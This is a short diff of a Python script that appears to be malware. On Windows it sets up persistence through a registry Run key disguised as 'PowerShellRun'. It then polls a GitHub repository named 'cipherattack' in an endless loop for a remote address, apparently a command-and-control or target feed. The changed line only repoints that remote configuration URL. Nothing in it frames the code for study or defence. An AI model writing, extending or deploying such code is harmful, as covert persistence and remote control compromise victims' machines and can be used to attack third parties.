@@ -80,7 +80,7 @@ if sys.platform == "win32":
         subprocess.call(f'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V "PowerShellRun" /t REG_SZ /F /D "{loc}"')
 while True:
     try:
-        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/war3w").read())
+        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/XureVip").read())
         if "fine" in [i.lower() for i in data.keys()]:
             addr = list(data.values())[0]
         else:
